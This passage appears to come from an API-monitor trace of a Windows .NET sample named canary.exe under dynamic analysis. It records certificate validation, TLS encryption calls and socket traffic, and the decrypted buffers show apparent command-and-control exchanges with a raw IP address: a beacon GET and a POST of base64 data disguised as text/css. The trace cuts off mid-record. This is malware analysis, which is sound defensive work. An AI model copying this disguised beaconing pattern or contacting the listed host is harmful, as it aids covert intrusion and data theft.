+[PAR] unsigned long  ulAttribute   : 0x53 (ISC_RET_DELEGATE | ISC_RET_MUTUAL_AUTH | ISC_RET_CONFIDENTIALITY | ISC_RET_USED_COLLECTED_CREDS)
+[PAR] void           *pBuffer      : 0x0000002641959920
+[RET] 0x7ffa2bc06c20 in [System.ni.dll]
+
+[CNT] [82]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertDuplicateCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FDDF0D0
+[FLD]                -> dwCertEncodingType = 0x1 (X509_ASN_ENCODING)
+[FLD]                -> pbCertEncoded      = 0x000000263FE3DED0
+[FLD]                -> pCertInfo          = 0x000000263FE188C0
+[FLD]                -> hCertStore         = 0x000000263FE2B6A0
+[RET] 0x7ffa2bc06db2 in [System.ni.dll]
+
+[CNT] [83]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertDuplicateStore> in [CRYPT32.dll] 
+[PAR] HCERTSTORE hCertStore : 0x000000263FE2B6A0
+[RET] 0x7ffa2bc06f62 in [System.ni.dll]
+
+[CNT] [84]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertEnumCertificatesInStore> in [CRYPT32.dll] 
+[PAR] HCERTSTORE     hCertStore       : 0x000000263FE2B6A0
+[PAR] PCCERT_CONTEXT pPrevCertContext : 0x0
+[RET] 0x7ffa2bc0705d in [System.ni.dll]
+
+[CNT] [85]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertDuplicateCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FDDF0D0
+[FLD]                -> dwCertEncodingType = 0x1 (X509_ASN_ENCODING)
+[FLD]                -> pbCertEncoded      = 0x000000263FE3DED0
+[FLD]                -> pCertInfo          = 0x000000263FE188C0
+[FLD]                -> hCertStore         = 0x000000263FE2B6A0
+[RET] 0x7ffa2bc06db2 in [System.ni.dll]
+
+[CNT] [86]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertEnumCertificatesInStore> in [CRYPT32.dll] 
+[PAR] HCERTSTORE     hCertStore       : 0x000000263FE2B6A0
+[PAR] PCCERT_CONTEXT pPrevCertContext : 0x000000263FDDF0D0
+[RET] 0x7ffa2bc0705d in [System.ni.dll]
+
+[CNT] [87]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertCloseStore> in [CRYPT32.dll] 
+[PAR] HCERTSTORE hCertStore : 0x000000263FE2B6A0
+[PAR] DWORD      dwFlags    : 0x0 
+[RET] 0x7ffa2bc06e7d in [System.ni.dll]
+
+[CNT] [88]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertFreeCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FDDF0D0
+[RET] 0x7ffa2bc01b28 in [System.ni.dll]
+
+[CNT] [89]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertOpenStore> in [CRYPT32.dll] 
+[PAR] LPCSTR            lpszStoreProvider : 0x2 (CERT_STORE_PROV_MEMORY)
+[PAR] DWORD             dwEncodingType    : 0x10001 (X509_ASN_ENCODING | PKCS_7_ASN_ENCODING)
+[PAR] HCRYPTPROV_LEGACY hCryptProv        : 0x0
+[PAR] DWORD             dwFlags           : 0x2204 (CERT_STORE_DEFER_CLOSE_UNTIL_LAST_FREE_FLAG | CERT_STORE_ENUM_ARCHIVED_FLAG | CERT_STORE_CREATE_NEW_FLAG)
+[PAR] const void        *pvPara           : 0x0
+[RET] 0x7ffa2bc07268 in [System.ni.dll]
+
+[CNT] [90]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertAddCTLLinkToStore> in [CRYPT32.dll] 
+[PAR] HCERTSTORE     hCertStore       : 0x000000263FE2AF50
+[PAR] PCCRL_CONTEXT  pCrlContext      : 0x000000263FDDF0D0
+[PAR] DWORD          dwAddDisposition : 0x4 (CERT_STORE_ADD_ALWAYS)
+[PAR] PCCRL_CONTEXT  *ppStoreContext  : 0x0
+[RET] 0x7ffa2bc073b6 in [System.ni.dll]
+
+[CNT] [91]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertGetCertificateChain> in [CRYPT32.dll] 
+[PAR] HCERTCHAINENGINE     hChainEngine     : 0x0
+[PAR] PCCERT_CONTEXT       pCertContext     : 0x000000263FDDF0D0
+[PAR] LPFILETIME           pTime            : 0x000000263FD2D380
+[PAR] HCERTSTORE           hAdditionalStore : 0x000000263FE2AF50
+[PAR] PCERT_CHAIN_PARA     pChainPara       : 0x000000263FD2D198
+[PAR] DWORD                dwFlags          : 0x0
+[PAR] LPVOID               pvReserved       : 0x0
+[PAR] PCCERT_CHAIN_CONTEXT *ppChainContext  : 0x000000263FD2D188
+[RET] 0x7ffa2bc076a9 in [System.ni.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0x914]
+
+[CNT] [92]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertDuplicateCertificateChain> in [CRYPT32.dll] 
+[PAR] PCCERT_CHAIN_CONTEXT pChainContext : 0x000000263FE5FEE0
+[RET] 0x7ffa2bc0787c in [System.ni.dll]
+
+[CNT] [93]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertDuplicateCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FDDF0D0
+[FLD]                -> dwCertEncodingType = 0x1 (X509_ASN_ENCODING)
+[FLD]                -> pbCertEncoded      = 0x000000263FE3DED0
+[FLD]                -> pCertInfo          = 0x000000263FE188C0
+[FLD]                -> hCertStore         = 0x000000263FE2B6A0
+[RET] 0x7ffa2bc06db2 in [System.ni.dll]
+
+[CNT] [94]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertFreeCertificateChain> in [CRYPT32.dll] 
+[RET] 0x7ffa2bc07135 in [System.ni.dll]
+
+[CNT] [95]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertVerifyCertificateChainPolicy> in [CRYPT32.dll] 
+[PAR] LPCSTR                    pszPolicyOID  : 0x1 (CERT_CHAIN_POLICY_BASE)
+[PAR] PCCERT_CHAIN_CONTEXT      pChainContext : 0x000000263FE5FEE0
+[PAR] PCERT_CHAIN_POLICY_PARA   pPolicyPara   : 0x000000263FE5FEE0
+[PAR] PCERT_CHAIN_POLICY_STATUS pPolicyStatus : 0x000000263FE5FEE0
+[RET] 0x7ffa2bc079bc in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <CertVerifyCertificateChainPolicy>
+[RES] BOOL 0x1
+
+[CNT] [96]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertVerifyCertificateChainPolicy> in [CRYPT32.dll] 
+[PAR] LPCSTR                    pszPolicyOID  : 0x4 (CERT_CHAIN_POLICY_SSL)
+[PAR] PCCERT_CHAIN_CONTEXT      pChainContext : 0x000000263FE5FEE0
+[PAR] PCERT_CHAIN_POLICY_PARA   pPolicyPara   : 0x000000263FE5FEE0
+[PAR] PCERT_CHAIN_POLICY_STATUS pPolicyStatus : 0x000000263FE5FEE0
+[RET] 0x7ffa2bbffb9f in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <CertVerifyCertificateChainPolicy>
+[RES] BOOL 0x1
+
+[CNT] [97]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertFreeCertificateChain> in [CRYPT32.dll] 
+[RET] 0x7ffa2bc07135 in [System.ni.dll]
+
+[CNT] [98]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertFreeCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FDDF0D0
+[RET] 0x7ffa2bc06cd8 in [System.ni.dll]
+
+[CNT] [99]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <SealMessage> in [SSPICLI.DLL] 
+[PAR] LSA_SEC_HANDLE ContextHandle         : 0x0000002641957A48
+[PAR] ULONG          QualityOfProtection   : 0x0
+[PAR] PSecBufferDesc MessageBuffers        : 0x000000264195BD10
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264195BD38
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x5
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x000000264195B9B8
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0xed
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264195B9BD
+[STR]                   -> "GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71."
+[STR]                      "0.3578.98 Safari/537.36\r\nCookie: PHPSESSID=ir01w34mah37x1sjingfx92gcm\r\nHost: 210.48.231.182\r\nConnection: Keep-Aliv"
+[STR]                      "e\r\n\r\n"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x24
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x000000264195BAAA
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] ULONG          MessageSequenceNumber : 0x0
+[RET] 0x7ffa2bc07b87 in [System.ni.dll]
+
+[CNT] [100]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x3d0
+[PAR] char   *buf : 0x000000264195B9B8
+[PAR] int    len  : 0x115
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [101]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <setsockopt> in [WS2_32.dll] 
+[PAR] SOCKET s       : 0x3d0
+[PAR] int    level   : 0xffff (SOL_SOCKET)
+[PAR] int    optname : 0x1006 (SO_RCVTIMEO)
+[PAR] char   *optval : 0x000000263FD2E148
+[PAR] int    optlen  : 0x4
+[RET] 0x7ffa2bc03721 in [System.ni.dll]
+
+[CNT] [102]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x000000264195BE70
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [103]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x000000264195BE95
+[PAR] int    len    : 0x100
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [104]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <DecryptMessage> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle    phContext    : 0x0000002641957A48
+[PAR] PSecBufferDesc pMessage     : 0x000000264195C0A8
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264195C0D0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x105
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264195BE90
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  MessageSeqNo : 0x0
+[PAR] unsigned long* pfQOP        : 0x0
+[RET] 0x7ffa2bc07c7d in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <DecryptMessage>
+[PAR] PSecBufferDesc pMessage     : 0x0000000400000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264195C0D0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x5
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x000000264195BE90
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0xe0
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264195BE95
+[STR]                   -> "HTTP/1.1 200 OK\r\nDate: Fri, 07 Mar 2025 16:41:50 GMT\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Length: 20\r\nKeep-A"
+[STR]                      "live: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/html; charset=UTF-8\r\n\r\nDmYJ6sFTT2NFyAtWjQ=="
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x20
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x000000264195BF75
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[CNT] [105]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <setsockopt> in [WS2_32.dll] 
+[PAR] SOCKET s       : 0x3d0
+[PAR] int    level   : 0xffff (SOL_SOCKET)
+[PAR] int    optname : 0x1006 (SO_RCVTIMEO)
+[PAR] char   *optval : 0x000000263FD2E738
+[PAR] int    optlen  : 0x4
+[RET] 0x7ffa2bc03721 in [System.ni.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0x918]
+
+[CNT] [106]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <QueryPerformanceCounter> in [KERNEL32.dll] 
+[RET] 0x7ffa2bbfd3f0 in [System.ni.dll]
+
+[CNT] [107]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x0000002641979508
+[FLD]               -> socket_0 = 0x00000000000003D0
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x000000263FD2E598
+[RET] 0x7ffa2bc0386a in [System.ni.dll]
+
+[CNT] [108]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <SealMessage> in [SSPICLI.DLL] 
+[PAR] LSA_SEC_HANDLE ContextHandle         : 0x0000002641957A48
+[PAR] ULONG          QualityOfProtection   : 0x0
+[PAR] PSecBufferDesc MessageBuffers        : 0x000000264197A858
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264197A880
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x5
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x000000264197A630
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0xeb
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264197A635
+[STR]                   -> "POST / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71"
+[STR]                      ".0.3578.98 Safari/537.36\r\nContent-Type: text/css\r\nHost: 210.48.231.182\r\nContent-Length: 340\r\nExpect: 100-continu"
+[STR]                      "e\r\n\r\n"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x24
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x000000264197A720
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] ULONG          MessageSequenceNumber : 0x0
+[RET] 0x7ffa2bc07b87 in [System.ni.dll]
+
+[CNT] [109]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x3d0
+[PAR] char   *buf : 0x000000264197A630
+[PAR] int    len  : 0x105
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [110]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x000000264197A950
+[FLD]               -> socket_0 = 0x00000000000003D0
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x000000263FD2E478
+[RET] 0x7ffa2bc0386a in [System.ni.dll]
+
+[CNT] [111]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <setsockopt> in [WS2_32.dll] 
+[PAR] SOCKET s       : 0x3d0
+[PAR] int    level   : 0xffff (SOL_SOCKET)
+[PAR] int    optname : 0x1006 (SO_RCVTIMEO)
+[PAR] char   *optval : 0x000000263FD2E468
+[PAR] int    optlen  : 0x4
+[RET] 0x7ffa2bc03721 in [System.ni.dll]
+
+[CNT] [112]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x000000264195BE90
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [113]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x000000264195BE95
+[PAR] int    len    : 0x30
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [114]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <DecryptMessage> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle    phContext    : 0x0000002641957A48
+[PAR] PSecBufferDesc pMessage     : 0x000000264197AA70
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264197AA98
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x35
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264195BE90
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  MessageSeqNo : 0x0
+[PAR] unsigned long* pfQOP        : 0x0
+[RET] 0x7ffa2bc07c7d in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <DecryptMessage>
+[PAR] PSecBufferDesc pMessage     : 0x0000000400000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264197AA98
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x5
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x000000264195BE90
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x19
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264195BE95
+[STR]                   -> "HTTP/1.1 100 Continue\r\n\r\n"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x17
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x000000264195BEAE
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[CNT] [115]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <SealMessage> in [SSPICLI.DLL] 
+[PAR] LSA_SEC_HANDLE ContextHandle         : 0x0000002641957A48
+[PAR] ULONG          QualityOfProtection   : 0x0
+[PAR] PSecBufferDesc MessageBuffers        : 0x000000264197AFA8
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264197AFD0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x5
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x000000264197AD18
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x154
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264197AD1D
+[STR]                   -> "33LsTGt2qYwqZw6+39eYiJ6dWRpufKA0uXkCgAALT2V+PMrW/U9CuZathJ6jQ4OQmrWHebBrBwQmREBSBS4cb/DUDqf3TGzRnghCORaCx15bxxUCxBZgKgQ7"
+[STR]                      "YQeyMnjvbjpAPKrEwhUUf/zl/WNCtEfqsZpBbZtszSqTSpZP7NYhFZsdcT/3C1z5en6h+wtyLYsuYuCUmCY8pRhTclHIOzgYVstR1id+I6cb3Dm+C7rG5kMA"
+[STR]                      "P0fDdZGmCnYGHQIRtcmHCM8f1++Kb1l5ooBP+X1oawzEzQPZlfzB2GDmNqpLWqwWxx4WN56WFVyBlOlDAGB7jNkklGF1PSY4mw=="
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x24
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x000000264197AE71
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] ULONG          MessageSequenceNumber : 0x0
+[RET] 0x7ffa2bc07b87 in [System.ni.dll]
+
+[CNT] [116]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x3d0
+[PAR] char   *buf : 0x000000264197AD18
+[PAR] int    len  : 0x175
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [117]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x000000264195BE90
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [118]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x000000264195BE95
+[PAR] int    len    : 0xe0
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [119]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <DecryptMessage> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle    phContext    : 0x0000002641957A48
+[PAR] PSecBufferDesc pMessage     : 0x000000264197B1E0
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264197B208
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0xe5
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264195BE90
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  MessageSeqNo : 0x0
+[PAR] unsigned long* pfQOP        : 0x0
+[RET] 0x7ffa2bc07c7d in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <DecryptMessage>
+[PAR] PSecBufferDesc pMessage     : 0x0000000400000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264197B208
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x5
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x000000264195BE90
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0xbc
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264195BE95
